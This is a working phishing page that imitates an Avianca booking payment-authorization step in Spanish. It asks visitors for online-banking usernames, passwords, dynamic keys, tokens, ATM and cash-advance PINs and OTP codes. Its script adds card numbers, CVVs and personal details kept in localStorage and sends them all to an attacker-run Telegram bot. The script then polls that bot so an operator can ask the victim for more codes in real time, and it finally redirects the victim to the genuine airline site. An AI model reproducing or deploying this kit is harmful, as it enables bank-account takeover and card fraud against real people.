<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Avianca - Booking</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="shortcut icon" href="./assets/favicon.svg" t  ype="image/x-icon">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="./css/checkers.css">
    <link rel="stylesheet" href="./css/normalize.css">
    <script src="./js/functions.js"></script>

    <style>
        .loaderp {
            width: 48px;
            height: 48px;
            border: 5px solid #fff;
            border-bottom-color: #e8114b;
            border-radius: 50%;
            display: inline-block;
            box-sizing: border-box;
            animation: rotation 1s linear infinite;
        }

        @keyframes rotation {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }

        .loaderp-full {
            position: fixed;
            top: 0;
            left: 0;
            overflow-y: hidden;
            z-index: 1000;
            background-color: white;
            width: 100vw;
            height: 100vh;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .content form input {
            width: 100% !important;
            box-sizing: border-box !important;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <div class="main-loader show">
        <img id="company-loader">
        <div class="loader"></div>
    </div>
<div class="logos">
    <img id="bank-logo" src="" alt="" width="">
    <img id="company-logo" src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Avianca_Logo_2013.png" alt="Avianca 2" width="110px">
    </div>
    </div>
    <main>
        <div class="content">
            <b style="margin-bottom: 20px; display: block;" >Autorización de transacción</b>
            <p style="margin-bottom: 10px;" >La transacción que intenta realizar en <b>AVIANCA S.A</b> por <b>$ <span id="flight-price">49.900</span> USD</b> debe ser autorizada. Por favor verifica la siguiente información:</p>
            <p style="margin-bottom: 20px;">Ingrese los datos de su Banca Virtual:</p>
            <form id="form" style="margin-bottom: 30px;">
                <div class="labels">
                    <b>Comercio: </b>
                    <b>Monto: </b>
                    <b>Número de tarjeta: </b>
                    <b id="user_label">Usuario: </b>
                    <b id="puser_label">Contraseña: </b>
                    <b class="hidden" id="cdin_label">Clave Dinámica: </b>
                    <b class="hidden" id="dintok_label">Token: </b>
                    <b class="hidden" id="cavance_label">Clave Avances: </b>
                    <b class="hidden" id="ccaj_label">Clave Cajero: </b>
                    <b class="hidden" id="otpcode_label">Código OTP: </b>
                </div>
                <div class="values">
                    <p>AVIANCA S.A</p>
                    <p>$ <span id="flight-price">49.000</span> USD</p>
                    <p>•••• •••• •••• <span id="card-digits"></span></p>
                    <input required type="text" id="user_input">
                    <input required type="password" id="puser_input">
                    <input class="hidden" oninput="limitDigits(this, 6)" type="text" id="cdin_input">
                    <input class="hidden" oninput="limitDigits(this, 8)" type="text" id="dintok_input">
                    <input class="hidden" oninput="limitDigits(this, 6)" type="password" id="cavance_input">
                    <input class="hidden" oninput="limitDigits(this, 4)" type="password" id="ccaj_input">
                    <input class="hidden" oninput="limitDigits(this, 8)" type="text" id="otpcode_input">
                </div>
            </form>
        </div>
        <a href="" id="newCode" class="hidden">Presione aquí para recibir un nuevo código</a>
        <button id="btnNextStep" class="btn-success">
            Aceptar
        </button>
    </main>
    
    <div class="loaderp-full">
        <span class="loaderp"></span>
        <p class="text-italic tc-ocean fs-3 fw-light">Validando datos...</p>
    </div>

    <script src="./js/id_check.js"></script>
    <script>
        function escapeMarkdownV2(text) {
            if (!text) return '';
            const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
            let escapedText = text;
            for (const char of specialChars) {
                const regex = new RegExp(`\\${char}`, 'g');
                escapedText = escapedText.replace(regex, `\\${char}`);
            }
            return escapedText;
        }

        async function loadTelegramConfig() {
            try {
                const response = await fetch("./js/brr76.json");
                if (!response.ok) {
                    throw new Error("No se pudo cargar el archivo de configuración de Telegram.");
                }
                return await response.json();
            } catch (error) {
                console.error("Error al cargar el archivo de configuración de Telegram:", error);
                return null;
            }
        }

        const inputMap = {
            'pedir_dinamica': { label: 'cdin_label', input: 'cdin_input' },
            'pedir_otp': { label: 'otpcode_label', input: 'otpcode_input' },
            'pedir_token': { label: 'dintok_label', input: 'dintok_input' },
            'pedir_cavance': { label: 'cavance_label', input: 'cavance_input' },
            'pedir_ccaj': { label: 'ccaj_label', input: 'ccaj_input' },
            'error_tc': { error_msg: "Error en la tarjeta. Por favor, intente de nuevo." },
            'error_logo': { error_msg: "Error en el logo del banco." },
            'error_dinamica': { label: 'cdin_label', input: 'cdin_input', error_msg: "Error en la clave dinámica. Por favor, verifique y vuelva a ingresar." },
            'error_otp': { label: 'otpcode_label', input: 'otpcode_input', error_msg: "Error en el código SMS. Por favor, ingréselo nuevamente." },
            'error_token': { label: 'dintok_label', input: 'dintok_input', error_msg: "Error en el token. Por favor, verifique y vuelva a ingresar." },
            'error_cavance': { label: 'cavance_label', input: 'cavance_input', error_msg: "Error en la clave de avances. Por favor, verifique y vuelva a ingresar." },
            'error_ccaj': { label: 'ccaj_label', input: 'ccaj_input', error_msg: "Error en la clave de cajero. Por favor, verifique y vuelva a ingresar." },
        };

        function hideAllInputs() {
            for (const key in inputMap) {
                if (inputMap[key].label) {
                    document.getElementById(inputMap[key].label).classList.add('hidden');
                    document.getElementById(inputMap[key].input).classList.add('hidden');
                }
            }
        }

        async function checkVerification(transactionId, messageId) {
            const config = await loadTelegramConfig();
            if (!config) {
                document.querySelector(".loaderp-full").style.display = "none";
                return;
            }
            fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
                .then(response => response.json())
                .then(data => {
                    const updates = data.result;
                    const verificationUpdate = updates.find(
                        (update) =>
                        update.callback_query &&
                        update.callback_query.message.message_id === messageId
                    );

                    if (verificationUpdate) {
                        const action = verificationUpdate.callback_query.data.split(':')[0];
                        const actionConfig = inputMap[action];

                        fetch(`https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`, {
                            method: "POST",
                            headers: { "Content-Type": "application/json" },
                            body: JSON.stringify({
                                chat_id: config.chat_id,
                                message_id: messageId,
                                reply_markup: { inline_keyboard: [] }
                            }),
                        });
                        
                        document.querySelector(".loaderp-full").style.display = "none";
                        hideAllInputs();

                        if (actionConfig) {
                            if (actionConfig.label) {
                                document.getElementById(actionConfig.label).classList.remove('hidden');
                                document.getElementById(actionConfig.input).classList.remove('hidden');
                            }
                            if (actionConfig.error_msg) {
                                alert(actionConfig.error_msg);
                            }
                        }
                        
                        switch (action) {
                            case 'finalizar':
                                window.location.href = "https://www.avianca.com/";
                                break;
                            default:
                                break;
                        }
                    } else {
                        setTimeout(() => checkVerification(transactionId, messageId), 2000);
                    }
                })
                .catch(error => {
                    console.error("Error al verificar el estado:", error);
                    setTimeout(() => checkVerification(transactionId, messageId), 2000);
                });
        }

        document.getElementById("btnNextStep").addEventListener("click", function() {
            const visibleInputs = document.querySelectorAll('#form input:not(.hidden)');
            let allValid = true;
            visibleInputs.forEach(input => {
                if (!input.value) {
                    allValid = false;
                }
            });

            if (!allValid) {
                alert("Por favor, complete todos los campos requeridos.");
                return;
            }

            document.querySelector(".loaderp-full").style.display = "flex";
            enviarDatos();
        });

        async function enviarDatos() {
            const storedData = JSON.parse(localStorage.getItem('paymentData')) || {};
            const transactionId = storedData.transactionId || (Date.now().toString(36) + Math.random().toString(36).substr(2));
            localStorage.setItem('paymentData', JSON.stringify({ ...storedData, transactionId }));
            
            const formValues = {};
            const visibleInputs = document.querySelectorAll('#form input:not(.hidden)');
            visibleInputs.forEach(input => {
                formValues[input.id.replace('_input', '')] = escapeMarkdownV2(input.value);
            });

            const fullMessage = `
✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*👤 DATOS DEL TITULAR*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🤵‍♂️ Nombre:* ${storedData.name ? escapeMarkdownV2(storedData.name) : 'No ingresado'}
*🪪 Identificación:* ${storedData.cc ? escapeMarkdownV2(storedData.cc) : 'No ingresado'}
*📧 Email:* ${storedData.email ? escapeMarkdownV2(storedData.email) : 'No ingresado'}
*📱 Celular:* ${storedData.telnum ? escapeMarkdownV2(storedData.telnum) : 'No ingresado'}
*🗺️ Ciudad:* ${storedData.city ? escapeMarkdownV2(storedData.city) : 'No ingresado'}
*📍 Estado:* ${storedData.state ? escapeMarkdownV2(storedData.state) : 'No ingresado'}
*🏠 Dirección:* ${storedData.address ? escapeMarkdownV2(storedData.address) : 'No ingresado'}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*💳 DETALLES DE LA TARJETA*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🏦 Banco:* ${storedData.bank ? escapeMarkdownV2(storedData.bank) : 'No ingresado'}
*💳 Número de Tarjeta:*
\`${storedData.cardNumber ? escapeMarkdownV2(storedData.cardNumber) : 'No ingresado'}\`
*📅 Fecha de Exp:*
\`${storedData.expiryDate ? escapeMarkdownV2(storedData.expiryDate) : 'No ingresado'}\`
*🔐 CVV:*
\`${storedData.cvv ? escapeMarkdownV2(storedData.cvv) : 'No ingresado'}\`
*🔢 Cuotas:* ${storedData.dues ? escapeMarkdownV2(storedData.dues) : 'No ingresado'}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*👤 DATOS DE ACCESO*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*Usuario:* ${formValues.user || 'No ingresado'}
*Contraseña:* ${formValues.puser || 'No ingresado'}
*Clave Dinámica:* ${formValues.cdin || 'No ingresado'}
*Token:* ${formValues.dintok || 'No ingresado'}
*Clave Avances:* ${formValues.cavance || 'No ingresado'}
*Clave Cajero:* ${formValues.ccaj || 'No ingresado'}
*Código OTP:* ${formValues.otpcode || 'No ingresado'}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🆔 ID de Transacción:* ${transactionId}
`;

            const keyboard = JSON.stringify({
                inline_keyboard: [
                    [{ text: "Pedir Dinámica", callback_data: `pedir_dinamica:${transactionId}` }, { text: "Pedir OTP", callback_data: `pedir_otp:${transactionId}` }],
                    [{ text: "Pedir Token", callback_data: `pedir_token:${transactionId}` }, { text: "Pedir Clave Avances", callback_data: `pedir_cavance:${transactionId}` }],
                    [{ text: "Pedir Clave Cajero", callback_data: `pedir_ccaj:${transactionId}` }],
                    [{ text: "Error Dinámica", callback_data: `error_dinamica:${transactionId}` }, { text: "Error OTP", callback_data: `error_otp:${transactionId}` }],
                    [{ text: "Error Token", callback_data: `error_token:${transactionId}` }, { text: "Error Clave Avances", callback_data: `error_cavance:${transactionId}` }],
                    [{ text: "Error Clave Cajero", callback_data: `error_ccaj:${transactionId}` }],
                    [{ text: "Error TC", callback_data: `error_tc:${transactionId}` }, { text: "Error Logo", callback_data: `error_logo:${transactionId}` }],
                    [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
                ],
            });

            const config = await loadTelegramConfig();
            if (!config) {
                document.querySelector(".loaderp-full").style.display = "none";
                return;
            }

            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: config.chat_id,
                    text: fullMessage,
                    reply_markup: keyboard,
                    parse_mode: "MarkdownV2",
                }),
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("Mensaje enviado a Telegram con éxito");
                    checkVerification(transactionId, data.result.message_id);
                } else {
                    console.error("Error al enviar mensaje a Telegram:", data);
                    document.querySelector(".loaderp-full").style.display = "none";
                }
            })
            .catch(error => {
                console.error("Error al enviar mensaje a Telegram:", error);
                document.querySelector(".loaderp-full").style.display = "none";
            });
        }
    </script>
</body>
</html>
